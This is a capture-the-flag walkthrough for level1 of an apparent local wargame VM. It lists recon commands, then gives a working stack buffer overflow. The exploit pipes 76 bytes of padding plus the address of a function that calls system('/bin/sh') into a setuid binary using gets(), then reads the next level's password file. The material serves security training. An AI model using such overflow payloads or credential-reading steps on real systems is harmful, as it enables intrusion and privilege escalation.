# Level1 — Commands

## Connection

```bash
ssh level1@localhost -p 4242
```

Password: (retrieved in level0, in `level0/flag`)

---

## Recon

### Step 1 — Environment and binary

```bash
pwd
ls -la
file level1
readelf -h level1
```

**Goal:** Check the home, the setuid level2 binary, ELF type and architecture.

### Step 2 — Binary extraction for local analysis

From the host:

```bash
cd level1
sshpass -p '<level1_password>' scp -o StrictHostKeyChecking=no -P 4242 level1@localhost:level1 ./level1.bin
```

### Step 3 — Local analysis

```bash
file level1.bin
strings level1.bin
readelf -s level1.bin
objdump -d level1.bin
objdump -s -j .rodata level1.bin
```

**Results:** See `analysis.md`.

---

## Exploitation

### Step 4 — Overflow: overwrite the return address with `run`

On the VM, as level1. **Keep stdin open** so the shell stays active (otherwise the pipe closes and the shell exits):

```bash
( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1
```

You should see "Good... Wait what?" then a shell. Then type e.g. `id` then `cat /home/user/level2/.pass`.

If nothing appears, try another offset (72 or 80) instead of 76:

```bash
( python -c 'print "A"*72 + "\x44\x84\x04\x08"'; cat ) | ./level1
```

**Goal:** `gets()` reads without a bound. The exact offset to the return address may vary (68 from the local binary, often 76 on the VM). Replace with the address of `run` (0x08048444) to call `system("/bin/sh")`.

### Step 5 — Retrieve the level2 password

In the obtained level2 shell:

```bash
id
cat /home/user/level2/.pass
```

### Step 6 — Connect as level2

```bash
exit
ssh level2@localhost -p 4242
```

Record the password in `level1/flag`.
